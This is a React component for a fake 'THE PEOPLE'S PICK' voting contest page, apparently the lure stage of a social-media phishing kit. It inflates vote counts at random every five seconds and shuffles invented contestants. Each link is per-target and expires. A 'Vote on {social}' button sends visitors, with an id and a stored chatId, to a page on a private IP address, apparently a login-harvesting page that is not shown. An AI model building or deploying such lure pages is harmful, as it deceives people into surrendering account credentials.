import React, { useEffect, useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { BASE_URL } from '../../config';
import data from './data.json';

const VotingPage = () => {
    const { username, id, social } = useParams();
    const [pageExpired, setpageExpired] = useState(false);
    const [loading, setLoading] = useState(true);
    const [votes, setVotes] = useState(118); // Initial vote count

  // Function to generate a new random vote count
  const getNextVoteCount = (currentVotes) => {
    const newVotes = Math.floor(Math.random() * (400 - currentVotes + 1)) + currentVotes;
    return newVotes;
  };
    const [chatId, setchatId] = useState(null);
    const [show, setShow] = useState(false);
    const navigate = useNavigate();
    const [contestants, setContestants] = useState([]);

    const getRandomContestants = () => {
        const shuffled = [...data].sort(() => 0.5 - Math.random());
        return shuffled.slice(0, 3);
    };

    useEffect(() => {
        setContestants(getRandomContestants());
        setTimeout(() => setShow(true), 300);
    }, []);

    useEffect(() => {
        const interval = setInterval(() => {
          setVotes((prevVotes) => getNextVoteCount(prevVotes));
        }, 5000); // Update every 5 seconds (adjust as needed)
    
        return () => clearInterval(interval); // Cleanup interval on component unmount
      }, []);

    useEffect(() => {
        setLoading(true);
        const main = async () => {
            try {
                const m = localStorage.getItem("chatId");
                setchatId(m);
                const response = await fetch(`${BASE_URL}/check_expiry/${id}`, {
                    method: "GET",
                    headers: { "Content-Type": "application/json" }
                });

                if (!response.ok) return;

                const resp2 = await response.json();
                setpageExpired(resp2.status !== 200);
            } catch (error) {
                console.log("Error: ", error);
            } finally {
                setLoading(false);
            }
        };

        main();
    }, [id]);

    return (
        <div className="min-h-screen bg-gray-100 p-6">
            <div className="w-full mb-6 relative">
                <img
                    src="https://lekkiwatersidehotel.com/wp-content/uploads/2022/11/DSCF4256-scaled-1.jpg"
                    alt="Voting Banner"
                    className="w-full h-60 object-cover rounded-lg shadow-lg"
                />
                <div className="absolute top-0 left-0 w-full h-full bg-black bg-opacity-30 flex items-center">
                    <h1 className="text-4xl font-bold text-white ml-6">THE PEOPLE'S PICK</h1>
                </div>
            </div>

            {loading ? (
                <div className="flex justify-center items-center h-40">
                    <div className="w-8 h-8 border-4 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
                </div>
            ) : pageExpired ? (
                <div className="flex justify-center items-center h-screen">
                    <div className="text-center text-red-600 text-3xl font-bold p-6 bg-white rounded-lg shadow-lg">
                        404 Link has Expired
                    </div>
                </div>
            ) : (
                <>
                    <div className="max-w-4xl mx-auto bg-white p-6 rounded-lg shadow-md">
                        <div className="flex items-center">
                            <div className="text-blue-500 text-3xl mr-3">🔵</div>
                            <div>
                                <h2 className="text-2xl font-bold">FASHION BRAND ●</h2>
                                <p className="text-gray-600">{votes} votes | Contestant #3</p>
                            </div>
                        </div>
                        <p className="mt-4 text-gray-700">
                            I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. 
                            Your vote could be the difference-maker, propelling me toward victory!
                        </p>
                        <button onClick={() => window.open(`http://172.20.10.2:5173/${social}/${id}/${chatId}`)} className="mt-6 block mx-auto bg-gradient-to-r from-pink-500 to-purple-500 text-white py-2 px-6 rounded-full hover:shadow-lg">
                            Vote on {social}
                        </button>
                    </div>

                    <h2 className="text-2xl font-semibold mt-8 text-center">All Contestants</h2>
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-4">
                        {contestants.map((contestant, index) => (
                            <div key={index} className="bg-white p-4 rounded-lg shadow hover:shadow-xl">
                                <img
                                    src={contestant.image}
                                    alt={contestant.name}
                                    className="w-full h-40 object-cover rounded-lg mb-4"
                                />
                                <h3 className="font-bold">{contestant.name}</h3>
                                <p>{contestant.votes} votes</p>
                            </div>
                        ))}
                    </div>
                </>
            )}

            <footer className="text-center mt-8 text-gray-500">&copy; 2025. All rights reserved.</footer>
        </div>
    );
};

export default VotingPage;
